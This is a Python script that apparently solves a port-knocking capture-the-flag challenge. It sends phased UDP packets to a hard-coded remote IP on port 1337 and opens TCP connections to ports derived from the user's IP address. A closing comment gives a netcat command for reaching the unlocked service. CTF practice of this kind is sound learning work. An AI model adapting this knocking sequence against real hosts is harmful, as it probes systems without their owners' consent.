import struct
import socket
import requests
import threading
import queue
import time
from typing import List, Dict, Optional, Callable

class UDPConnection:
    def __init__(self, local_port: int):
        self.local_port = local_port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.bind(('0.0.0.0', local_port))
        self.running = False

    def start_receiving(self):
        self.running = True
        self.receive_thread = threading.Thread(target=self._receive_loop)
        self.receive_thread.daemon = True
        self.receive_thread.start()

    def _receive_loop(self):
        self.socket.settimeout(1.0)  # 1 second timeout for clean shutdown
        while self.running:
            try:
                data, addr = self.socket.recvfrom(1024)
                print(self.local_port, data)
            except socket.timeout:
                continue
            except Exception as e:
                print(f"Error receiving data: {e}")
                break

    def send(self, data: bytes, target_address: tuple):
        try:
            self.socket.sendto(data, target_address)
        except Exception as e:
            print(f"Error sending data: {e}")

    def stop(self):
        self.running = False
        self.socket.close()

class UDPConnectionManager:
    def __init__(self):
        self.connections: Dict[int, UDPConnection] = {}

    def create_connection(self, local_port: int) -> UDPConnection:
        if local_port in self.connections:
            raise ValueError(f"Connection already exists on port {local_port}")

        connection = UDPConnection(local_port)
        self.connections[local_port] = connection
        connection.start_receiving()
        return connection

    def close_all(self):
        for connection in self.connections.values():
            connection.stop()
        self.connections.clear()

class TCPConnection:
    def __init__(self, local_port: Optional[int] = None):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if local_port:
            self.socket.bind(('0.0.0.0', local_port))
        self.connected = False
        self.connecting = False
        self._connect_thread = None
        self._connect_timeout = 10  # Default timeout in seconds

    def connect_async(self, target_address: tuple, callback: Optional[Callable] = None) -> None:
        """Initiates an asynchronous connection attempt"""
        if self.connecting or self.connected:
            return

        self.connecting = True
        self._connect_thread = threading.Thread(
            target=self._connect_worker,
            args=(target_address, callback)
        )
        self._connect_thread.daemon = True
        self._connect_thread.start()

    def _connect_worker(self, target_address: tuple, callback: Optional[Callable]) -> None:
        try:
            # Set socket timeout for the connection attempt
            self.socket.settimeout(self._connect_timeout)
            self.socket.connect(target_address)
            self.connected = True
            if callback:
                callback(self, True)
        except Exception as e:
            print(f"Connection failed to {target_address}: {e}")
            self.connected = False
            if callback:
                callback(self, False)
        finally:
            self.connecting = False
            self.socket.settimeout(None)  # Reset timeout

    def send(self, data: bytes) -> bool:
        if not self.connected:
            print("Not connected")
            return False

        try:
            self.socket.send(data)
            return True
        except Exception as e:
            print(f"Send failed: {e}")
            self.connected = False
            return False

    def close(self):
        try:
            self.socket.shutdown(socket.SHUT_RDWR)
        except:
            pass
        self.socket.close()
        self.connected = False
        self.connecting = False

class TCPConnectionManager:
    def __init__(self):
        self.connections: Dict[str, TCPConnection] = {}
        self._lock = threading.Lock()

    def _connection_callback(self, conn_id: str, connection: TCPConnection, success: bool):
        """Callback handler for connection attempts"""
        with self._lock:
            if success:
                self.connections[conn_id] = connection
            else:
                connection.close()
                if conn_id in self.connections:
                    del self.connections[conn_id]


    def create_connection(self, target_address: tuple, local_port: Optional[int] = None) -> Optional[TCPConnection]:
        conn_id = f"{target_address[0]}:{target_address[1]}"

        with self._lock:
            if conn_id in self.connections:
                print(f"Connection to {conn_id} already exists")
                return None

            connection = TCPConnection(local_port)
            # Store connection immediately but mark as not connected
            self.connections[conn_id] = connection

        # Start async connection
        connection.connect_async(
            target_address,
            callback=lambda conn, success: self._connection_callback(conn_id, conn, success)
        )

        return connection

    def close_all(self):
        with self._lock:
            for connection in self.connections.values():
                connection.close()
            self.connections.clear()


MY_IP = None
if not isinstance(MY_IP, tuple):
    raise ValueError("set MY_IP to a 4-tuple of your ip")
REM_UDP = ("44.220.174.32", 1337)

def p32(x):
    return struct.pack("<I", x)

def bswap16(x):
    return struct.unpack(">H", struct.pack("<H", x))[0]

def send_buf(c, phase):
    c.send(p32(((phase + 48) << 24) | (0x20 << 16) | bswap16(c.local_port)), REM_UDP)


def main():
    manager = UDPConnectionManager()
    tcp = TCPConnectionManager()

    try:
        conn1 = manager.create_connection(0x8813)
        #conn2 = manager.create_connection(5100)
        #conn3 = manager.create_connection(5200)
        #conn4 = manager.create_connection(5300)

        send_buf(conn1, 1)

        time.sleep(0.5)

        def req(p):
            print(requests.get("http://" + REM_UDP[0] + ":" + str(p) + "/"))

        def mk_guy(p):
            #def dummy():
            #    req(p)

            #t = threading.Thread(target=dummy)
            #t.start()

            tcp.create_connection((REM_UDP[0], p))

        mk_guy(1)

        time.sleep(0.5)

        send_buf(conn1, 2)

        time.sleep(0.5)

        for i in MY_IP:
            mk_guy(i)

        time.sleep(0.5)

        send_buf(conn1, 3)

        # nc -vvv knock.chal.hackthe.vote 1337
        # might have to try a few times due to remote 10 sec timer

        time.sleep(10)

    finally:
        # Clean up
        manager.close_all()

if __name__ == "__main__":
    main()
